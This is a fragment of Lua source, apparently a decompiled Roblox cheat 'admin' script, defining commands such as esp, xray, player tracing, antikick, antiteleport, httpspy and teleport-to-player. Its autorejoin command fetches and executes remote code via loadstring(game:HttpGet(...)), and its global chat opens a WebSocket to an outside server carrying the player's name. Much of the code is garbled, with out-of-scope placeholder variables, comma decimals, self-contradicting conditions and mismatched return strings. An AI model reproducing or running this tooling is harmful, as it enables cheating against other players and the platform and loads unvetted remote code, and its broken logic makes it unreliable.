        vb.filter(LocalPlayer.Backpack:GetChildren(), function(a, b)
          return b:FindFirstChild("Handle") and b:IsA("Tool") and b.Handle:FindFirstChildWhichIsA("Sound")
        end)[1]:FindFirstChildWhichIsA("RemoteEvent"):FireServer("PlaySong", tonumber(b[1]))
        vb.filter(LocalPlayer.Backpack:GetChildren(), function(a, b)
          return b:FindFirstChild("Handle") and b:IsA("Tool") and b.Handle:FindFirstChildWhichIsA("Sound")
        end)[1].Parent = LocalPlayer.Backpack
        c[vb.filter(LocalPlayer.Backpack:GetChildren(), function(a, b)
          return b:FindFirstChild("Handle") and b:IsA("Tool") and b.Handle:FindFirstChildWhichIsA("Sound")
        end)[1]] = true
        coroutine.wrap(function()
          while va("forceplay").CmdExtra[vb] do
            vb.Handle.Sound.Playing = true
            RunService.Heartbeat:Wait()
          end
          vc.RespectFilteringEnabled = true
        end)()
        return "now forceplaying " .. b[1]
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("unforceplay", {}, "stops forceplay", {}, function()
        for fe, fg in next, va("forceplay").CmdExtra, nil do
          fe:FindFirstChild("Sound", true).Playing = false
          va("forceplay").CmdExtra[fe] = false
        end
        return "stopped forceplay"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("audiotime", {
        "audiotimeposition"
      }, "changes audio timeposition", {"1", 1}, function(a, b)
        if b then
          return "time must be a number"
        end
        if not next((vb.filter(vb.tbl_concat(LocalPlayer.Backpack:GetChildren(), vc():GetChildren()), function(a, b)
          return b:IsA("Tool") and not b and b.Handle:FindFirstChildWhichIsA("Sound") and b.Handle:FindFirstChildWhichIsA("Sound").Playing == true
        end))) and b then
          return "you need a boombox to change the timeposition"
        end
        if vb.filter(vb.tbl_concat(LocalPlayer.Backpack:GetChildren(), vc():GetChildren()), function(a, b)
          return b:IsA("Tool") and not b and b.Handle:FindFirstChildWhichIsA("Sound") and b.Handle:FindFirstChildWhichIsA("Sound").Playing == true
        end)[1] then
          vb.filter(vb.tbl_concat(LocalPlayer.Backpack:GetChildren(), vc():GetChildren()), function(a, b)
            return b:IsA("Tool") and not b and b.Handle:FindFirstChildWhichIsA("Sound") and b.Handle:FindFirstChildWhichIsA("Sound").Playing == true
          end)[1]:FindFirstChild("Sound", true).TimePosition = math.floor(tonumber(b[1]))
        else
          for fl, fm in next, va("forceplay").CmdExtra, nil do
            fl:FindFirstChild("Sound", true).TimePosition = math.floor(tonumber(b[1]))
          end
        end
        return "changed time position to " .. b[1]
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("audiolog", {}, "audio logs someone", {"1"}, function(a, b)
        for fh, fj in next, va(b[1]), nil do
          for fo, fp in next, fj.Character:GetDescendants() do
            if fp:IsA("Sound") and not b then
              setclipboard(fp.SoundId:split("=")[2])
              vb.Notify(a, "Command", ("Audio Id (%s) copied to clipboard"):format(fp.SoundId:split("=")[2]))
            end
          end
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("position", {"pos"}, "shows you a player's current (cframe) position", {}, function(a, b)
        if setclipboard then
          setclipboard((vc(vb(b or a).CFrame)))
        end
        return ("%s's position: %s"):format(b or a.Name, (vc(vb(b or a).CFrame)))
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("grippos", {}, "changes grippos of your tool", {"3"}, function(a, b, c)
        if b then
        end
        vb(LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool"), "GripPos")
        LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool").GripPos = Vector3.new(tonumber(b[1]), tonumber(b[2]), tonumber(b[3]))
        LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool").Parent = va()
        return "grippos set"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("truesightguis", {"tsg"}, "true sight on all guis", {}, function(a, b, c)
        for fh, fj in next, game:GetDescendants() do
          if not b or not b and b then
            c[fj] = fj.Visible
            va(fj, "Visible")
            fj.Visible = true
          end
        end
        return "truesight for guis are now on"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("notruesightguis", {
        "untruesightguis",
        "notsg"
      }, "removes truesight on guis", {}, function(a, b)
        for fh, fj in next, va("truesightguis").CmdExtra, nil do
          fh.Visible = fj
        end
        return "truesight for guis are now off"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("locate", {}, "locates a player", {"1"}, function(a, b, c)
        for fj, fk in next, va(b[1]), nil do
          c[fk.Name] = vb.Locate(fk)
        end
        if b then
          vb.UpdateLocations()
        end
        return "locating player"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("unlocate", {"nolocate"}, "disables location for a player", {"1"}, function(a, b)
        for fj, fk in next, va("locate").CmdExtra, nil do
          for fp, fn in next, vb(b[1]), nil do
            if fj == fn.Name then
              fk()
              vc.Notify(a, "Command", fn.Name .. " is no longer being located")
              break
            else
              vc.Notify(a, "Command", fn.Name .. " isn't being located")
            end
          end
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("cameralock", {"calock"}, "locks your camera on the the players head", {"1"}, function(a, b, c)
        vb(vc.CurrentCamera, "CoordinateFrame", CFrame.new(vc.CurrentCamera.CoordinateFrame.p, vd().Head.CFrame.p))
        AddConnection(RunService.Heartbeat:Connect(function()
          if va(vb) and not vb then
            vd.CurrentCamera.CoordinateFrame = CFrame.new(vd.CurrentCamera.CoordinateFrame.p, va(vb).Head.CFrame.p)
          end
        end), c)
        return "now locking camera to " .. va(b[1])[1].Name
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("uncameralock", {"nocalock"}, "unlocks your camera", {}, function(a, b)
        if b then
          return "you aren't cameralocked"
        end
        vb("cameralock")
        return "cameralock disabled"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("esp", {}, "turns on player esp", {}, function(a, b, c)
        c.Billboards = {}
        va.forEach(vb("others"), function(a, b)
          va.Billboards[3 + 1] = vb.Locate(b)
          AddConnection(b.CharacterAdded:Connect(function()
            va.Character:WaitForChild("HumanoidRootPart")
            va.Character:WaitForChild("Head")
            vb.Billboards[1 + 1] = vc.Locate(va)
          end), va)
        end)
        AddConnection(Players.PlayerAdded:Connect(function(a)
          a.CharacterAdded:Wait()
          a.Character:WaitForChild("HumanoidRootPart")
          a.Character:WaitForChild("Head")
          va.Billboards[2 + 1] = vb.Locate(a)
          AddConnection(a.CharacterAdded:Connect(function()
            va.Character:WaitForChild("HumanoidRootPart")
            va.Character:WaitForChild("Head")
            vb.Billboards[1 + 1] = vc.Locate(va)
          end), va)
        end), c)
        if not vd then
          vc.UpdateLocations()
        end
        return "esp enabled"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("noesp", {"unesp"}, "turns off esp", {}, function(a, b)
        for fh, fj in next, va("esp").CmdExtra.Billboards, nil do
          fj()
        end
        va("esp").CmdExtra.Billboards = nil
        vb("esp")
        return "esp disabled"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("trace", {}, "traces a player", {
        function()
          return Drawing ~= nil
        end,
        "1"
      }, function(a, b, c)
        for fj, fk in next, va(b[1]), nil do
          c[fk.Name] = vb.Trace(fk)
        end
        if not vc then
          vb.UpdateTracers()
        end
        return "tracing player"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("untrace", {"notrace"}, "removes the trace from a player", {"1"}, function(a, b)
        if not next(vb("trace").CmdExtra) then
          return "you aren't tracing anyone"
        end
        for fj, fk in next, va(b[1]), nil do
          if not b then
            vb("trace").CmdExtra[fk.Name]()
            vb("trace").CmdExtra[fk.Name] = nil
          end
        end
        return "tracing disabled"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("walkto", {}, "walks to a player", {"1", 3}, function(a, b)
        vb():MoveTo(vc(va(b[1])[1]).Position)
        return "walking to " .. va(b[1])[1].Name
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("follow", {}, "follows a player", {"1", 3}, function(a, b, c)
        c[va(b[1])[1].Name] = true
        coroutine.wrap(function()
          repeat
            va():MoveTo(vb(vc).Position)
            wait(0,2)
          until vc.Name
        end)()
        return "now following " .. va(b[1])[1].Name
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("unfollow", {}, "unfollows a player", {}, function()
        if not next(va("follow").CmdExtra) then
          return "you are not following anyone"
        end
        va("follow").CmdExtra = {}
        return "stopped following"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("age", {}, "ages a player", {"1"}, function(a, b)
        for fh, fj in next, va(b[1]), nil do
          os.date("*t", os.time()).day = os.date("*t", os.time()).day - tonumber(fj.AccountAge)
          vb.Notify(a, "Command", ("%s's age is %s (%s)"):format(fj.Name, fj.AccountAge, (os.date("%d/%m/%y", os.time((os.date("*t", os.time())))))))
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("nosales", {}, "no purchase prompt notifications will be shown", {}, function()
        va.PurchasePromptApp.PurchasePromptUI.Visible = false
        return "You'll no longer recive sale prompts"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("volume", {"vol"}, "changes your game volume", {}, function(a, b)
        if b or tonumber(b[1]) > 10 or tonumber(b[1]) < 0 then
          return "volume must be a number between 0-10"
        end
        UserSettings():GetService("UserGameSettings").MasterVolume = tonumber(b[1]) / 10
        return "volume set to " .. tonumber(b[1])
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("antikick", {}, "client sided bypasses to kicks", {}, function()
        va = not va
        return "client sided antikick " .. ("client sided antikick " or "disabled")
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("antiteleport", {}, "client sided bypasses to teleports", {}, function()
        va = not va
        return "client sided antiteleport " .. ("client sided antiteleport " or "disabled")
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("autorejoin", {}, "auto rejoins the game when you get kicked", {}, function(a, b, c)
        AddConnection((va:FindFirstChild("RobloxPromptGui"):FindFirstChildWhichIsA("Frame").DescendantAdded:Connect(function(a)
          if a.Name == "ErrorTitle" then
            a:GetPropertyChangedSignal("Text"):Wait()
            if a.Text == "Disconnected" then
              syn.queue_on_teleport("loadstring(game:HttpGet(\"https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua\"))()")
              va:TeleportToPlaceInstance(game.PlaceId, game.JobId)
            end
          end
        end)))
        c[4 + 1] = va:FindFirstChild("RobloxPromptGui"):FindFirstChildWhichIsA("Frame").DescendantAdded:Connect(function(a)
          if a.Name == "ErrorTitle" then
            a:GetPropertyChangedSignal("Text"):Wait()
            if a.Text == "Disconnected" then
              syn.queue_on_teleport("loadstring(game:HttpGet(\"https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua\"))()")
              va:TeleportToPlaceInstance(game.PlaceId, game.JobId)
            end
          end
        end)
        return "auto rejoin enabled (rejoins when you get kicked from the game)"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("respawn", {}, "respawns your character", {3}, function()
        vb():BreakJoints()
        LocalPlayer.CharacterAdded:Wait()
        LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = va().CFrame
        return "successfully respawned?"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("reset", {}, "resets your character", {3}, function()
        va():BreakJoints()
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("refresh", {"re"}, "refreshes your character", {3}, function(a)
        va()
        wait(Players.RespawnTime - 0,03)
        vc()
        LocalPlayer.CharacterAdded:Wait()
        LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = vb().CFrame
        return "character refreshed"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("addalias", {}, "adds an alias to a command", {}, function(a, b)
        if not b then
          va[b[1]].Name = b[2]
          va[b[2]] = va[b[1]]
          return ("%s is now an alias of %s"):format(b[2], b[1])
        else
          return b[1] .. " is not a valid command"
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("removealias", {}, "removes an alias from a command", {}, function(a, b)
        if b then
          return b[1] .. " is not a valid command"
        end
        if b then
          return b[2] .. " is not an alias"
        end
        if va[b[2]].Name ~= b[2] then
          va[b[2]] = nil
          return ("removed alias %s from %s"):format(b[2], va[b[2]].Name)
        end
        return "you can't remove commands"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("chatlogs", {"clogs"}, "enables chatlogs", {}, function()
        vb.ClearAllObjects(va.Frame.List)
        va.Visible = true
        va.Frame.List:Destroy()
        va.Frame.List:Clone().Parent = va.Frame
        for fg, fh in next, va.Frame.List:GetChildren() do
          if vb.TweenAllTransToObject(va, 0,25, vc) then
            vb.Tween(fh, "Sine", "Out", 0,25, {TextTransparency = 0})
          end
        end
        va.Frame.List.UIListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
          if va.Frame.List.CanvasSize.Y.Offset - va.Frame.List.AbsoluteSize.Y - va.Frame.List.CanvasPosition.Y <= 20 then
            wait()
            va.Frame.List.CanvasPosition = Vector2.new(0, 6 + 1000)
          end
        end)
        vb.Tween(va.Frame.List, "Sine", "Out", 0,25, {ScrollBarImageTransparency = 0})
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("globalchatlogs", {
        "globalclogs"
      }, "enables globalchatlogs", {}, function()
        vb.ClearAllObjects(va.Frame.List)
        va.Visible = true
        va.Frame.List:Clone().Parent = vd.Frame
        for fg, fh in next, va.Frame.List:GetChildren() do
          if not fh:IsA("UIListLayout") then
            vb.Tween(fh, "Sine", "Out", 0,25, {TextTransparency = 0})
          end
        end
        va.Frame.List.UIListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
          if va.Frame.List.CanvasSize.Y.Offset - va.Frame.List.AbsoluteSize.Y - va.Frame.List.CanvasPosition.Y < 20 then
            wait()
            va.Frame.List.CanvasPosition = Vector2.new(0, 6 + 1000)
          end
        end)
        vb.Tween(va.Frame.List, "Sine", "Out", 0,25, {ScrollBarImageTransparency = 0})
        ve = true
        if vb.TweenAllTransToObject(va, 0,25, vc) then
          if vb.TweenAllTransToObject(va, 0,25, vc) or vb.TweenAllTransToObject(va, 0,25, vc) then
          end
          Socket = WebSocket.connect("ws://fate0.xyz:8080/scripts/fates-admin/chat?username=" .. LocalPlayer.Name)
          Socket.OnMessage:Connect(function(a)
            if not a then
              a = vb:JSONDecode(a)
              if not a.fromDiscord or vc:Clone() then
              end
              vc:Clone().Text = ("%s - [%s]: %s"):format(tostring(os.date("%X")), a.username, a.message)
              if not vc:Clone() then
                vc:Clone().TextColor3 = Color3.fromRGB(a.tagColour[1], a.tagColour[2], a.tagColour[3])
              end
              vc:Clone().Visible = true
              vc:Clone().TextTransparency = 1
              vc:Clone().Parent = vd.Frame.List
              ve.Tween(vc:Clone(), "Sine", "Out", 0,25, {TextTransparency = 0})
              vd.Frame.List.CanvasSize = UDim2.fromOffset(0, vd.Frame.List.UIListLayout.AbsoluteContentSize.Y)
            end
          end)
          while Socket and wait(30) do
            Socket:Send("ping")
          end
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("httplogs", {"httpspy"}, "enables httpspy", {}, function()
        vb.ClearAllObjects(va.Frame.List)
        va.Visible = true
        va.Frame.List:Destroy()
        va.Frame.List:Clone().Parent = va.Frame
        for fg, fh in next, va.Frame.List:GetChildren() do
          if not fh:IsA("UIListLayout") then
            vb.Tween(fh, "Sine", "Out", 0,25, {TextTransparency = 0})
          end
        end
        va.Frame.List.UIListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
          if va.Frame.List.CanvasSize.Y.Offset - va.Frame.List.AbsoluteSize.Y - va.Frame.List.CanvasPosition.Y < 20 then
            wait()
            va.Frame.List.CanvasPosition = Vector2.new(0, 6 + 1000)
          end
        end)
        vb.Tween(va.Frame.List, "Sine", "Out", 0,25, {ScrollBarImageTransparency = 0})
        if not vb.TweenAllTransToObject(va, 0,25, vc) and not vb.TweenAllTransToObject(va, 0,25, vc) then
          vd:Clone().Text = "httpspy loaded"
          vd:Clone().RichText = true
          vd:Clone().Visible = true
          vd:Clone().TextTransparency = 1
          vd:Clone().Parent = va.Frame.List
          vb.Tween(vd:Clone(), "Sine", "Out", 0,25, {TextTransparency = 0})
          va.Frame.List.CanvasSize = UDim2.fromOffset(0, va.Frame.List.UIListLayout.AbsoluteContentSize.Y)
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("btools", {}, "gives you btools", {3}, function(a, b)
        for fh = 1, 4 do
          Instance.new("HopperBin").BinType = fh
          va((Instance.new("HopperBin")))
          Instance.new("HopperBin").Parent = LocalPlayer.Backpack
        end
        return "client sided btools loaded"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("spin", {}, "spins your character (optional: speed)", {}, function(a, b, c)
        va((Instance.new("BodyAngularVelocity")))
        Instance.new("BodyAngularVelocity").Parent = vb()
        Instance.new("BodyAngularVelocity").MaxTorque = Vector3.new(0, math.huge, 0)
        Instance.new("BodyAngularVelocity").AngularVelocity = Vector3.new(0, b[1] or 5, 0)
        c[5 + 1] = Instance.new("BodyAngularVelocity")
        return "started spinning"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("unspin", {}, "unspins your character", {}, function(a, b)
        for fh, fj in next, va("spin").CmdExtra, nil do
          fj:Destroy()
        end
        return "stopped spinning"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("goto", {"to"}, "teleports yourself to the other character", {3, "1"}, function(a, b)
        for fj, fk in next, va(b[1]), nil do
          if not b then
            wait((tonumber(b[2])))
          end
          vb().CFrame = vb(fk).CFrame * CFrame.new(-5, 0, 0)
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("loopgoto", {"loopto"}, "loop teleports yourself to the other character", {3, "1"}, function(a, b, c)
        c[va(b[1])[1].Name] = RunService.Heartbeat:Connect(function()
          va().CFrame = va(vb).CFrame * CFrame.new(0, 0, 2)
        end)
        vc(LocalPlayer, (RunService.Heartbeat:Connect(function()
          va().CFrame = va(vb).CFrame * CFrame.new(0, 0, 2)
        end)))
        AddConnection((RunService.Heartbeat:Connect(function()
          va().CFrame = va(vb).CFrame * CFrame.new(0, 0, 2)
        end)))
        return "now looping to " .. va(b[1])[1].name
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("unloopgoto", {"unloopto"}, "removes loop teleportation to the other character", {}, function(a)
        if not next(va("loopgoto").CmdExtra) then
          return "you aren't loop teleporting to anyone"
        end
        vb("loopgoto")
        return "loopgoto disabled"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("tweento", {"tweengoto"}, "tweens yourself to the other person", {3, "1"}, function(a, b)
        for fh, fj in next, va(b[1]), nil do
          vb:Create(vc(), TweenInfo.new(2), {
            CFrame = vc(fj).CFrame
          }):Play()
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("truesight", {"ts"}, "shows all the transparent stuff", {}, function(a, b, c)
        for fk, fl in next, va:GetDescendants() do
          if not b and fl.Transparency > 0,3 then
            c[fl] = fl.Transparency
            vb(fl, "Transparency")
            fl.Transparency = 0
          end
        end
        return ("%d items shown in %.3f (s)"):format(3 + 1, (tick() or os.clock()) - (tick() or os.clock()))
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("notruesight", {"nots"}, "removes truesight", {}, function(a, b)
        if b then
        end
        for fj, fk in next, va("truesight").CmdExtra, nil do
          fj.Transparency = fk
        end
        if b then
        end
        return ("%d items hidden in %.3f (s)"):format(#va("truesight").CmdExtra, os.clock() - os.clock())
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("xray", {}, "see through wallks", {}, function(a, b, c)
        for fh, fj in next, va:GetDescendants() do
          if fj:IsA("Part") and fj.Transparency <= 0,3 then
            c[fj] = fj.Transparency
            vb(fj, "Transparency")
            fj.Transparency = 0,3
          end
        end
        return "xray is now on"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("noxray", {"unxray"}, "stops xray", {}, function(a, b)
        if b then
        end
        for fj, fk in next, va("xray").CmdExtra, nil do
          fj.Transparency = fk
        end
        return "xray is now off"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("credits", {}, "shows the credits", {}, function(a, b)
        return "xray is now off"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("nolights", {}, "removes all lights", {}, function(a, b, c)
        va(vb, "GlobalShadows")
        for fh, fj in next, game:GetDescendants() do
          if fj:IsA("PointLight") or not b or not b then
            c[fj] = fj.Parent
            fj.Parent = nil
          end
        end
        vb.GlobalShadows = true
        return "removed all lights"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("revertnolights", {"lights"}, "reverts nolights", {}, function()
        for fe, fg in next, va("nolights").CmdExtra, nil do
          fe.Parent = fg
        end
        return "fullbright disabled"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("fullbright", {"fb"}, "turns on fullbright", {}, function(a, b, c)
        for fh, fj in next, game:GetDescendants() do
          if not b or fj:IsA("SurfaceLight") or not b then
            c[fj] = fj.Range
            va(fj)
            fj.Enabled = true
            fj.Shadows = false
            fj.Range = math.huge
          end
        end
        vb(vc, "GlobalShadows")
        vc.GlobalShadows = false
        return "fullbright enabled"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("nofullbright", {
        "revertlights",
        "unfullbright",
        "nofb"
      }, "reverts fullbright", {}, function()
        for fe, fg in next, va("fullbright").CmdExtra, nil do
          fe.Range = fg
        end
        vb.GlobalShadows = true
        return "fullbright disabled"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("swim", {}, "allows you to use the swim state", {3}, function(a, b, c)
        vb((va()))
        for fj, fk in next, Enum.HumanoidStateType:GetEnumItems() do
          va():SetStateEnabled(fk, false)
        end
        c[1] = va():GetState()
        va():ChangeState(Enum.HumanoidStateType.Swimming)
        vc(vd, "Gravity")
        vd.Gravity = 0
        coroutine.wrap(function()
          va.Died:Wait()
          vb.Gravity = 198
        end)()
        return "swimming enabled"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("unswim", {"noswim"}, "removes swim", {}, function(a, b)
        for fh, fj in next, Enum.HumanoidStateType:GetEnumItems() do
          va():SetStateEnabled(fj, true)
        end
        va():ChangeState(vb("swim").CmdExtra[1])
        vc.Gravity = 198
        return "swimming disabled"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("disableanims", {"noanims"}, "disables character animations", {3}, function(a, b)
        vb(va():FindFirstChild("Animate"), "Disabled")
        va():FindFirstChild("Animate").Disabled = true
        return "animations disabled"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("enableanims", {"anims"}, "enables character animations", {3}, function(a, b)
        va():FindFirstChild("Animate").Disabled = false
        return "animations enabled"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
